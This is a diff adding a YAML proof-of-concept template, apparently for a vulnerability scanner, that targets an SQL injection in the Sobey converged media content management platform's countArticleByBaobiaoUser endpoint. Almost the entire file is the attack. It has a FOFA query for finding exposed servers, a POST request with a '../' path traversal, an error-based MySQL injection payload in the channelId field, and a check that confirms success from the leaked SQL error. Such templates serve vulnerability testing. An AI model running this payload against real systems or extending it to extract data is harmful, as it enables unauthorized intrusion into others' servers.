@@ -1,0 +1,20 @@
+id: poc-yaml-sobey-imcmp-countarticlebybaobiaouser-sqli
+info:
+  name: 索贝融合媒体内容管理平台 countArticleByBaobiaoUser SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 索贝融合媒体内容管理平台
+  fofa: body="/Sc-TaskMonitoring/" || header="Sobey"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /sobey-mchEditor/mch/statistics/js/../countArticleByBaobiaoUser
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: channelId=1 AND GTID_SUBSET(CONCAT(0x7e,(SELECT (ELT(1944=1944,md5({{.t1}})))),0x7e),1944)&token=1&siteCode=1
+  expression: status_code == 500 && contains(body,"Sobey") && contains(body,"countArticleByBaobiaoUser")
+    && contains(body,`~` + t2 + `~`) && contains(body,"java.sql.SQLException")
+transport: http
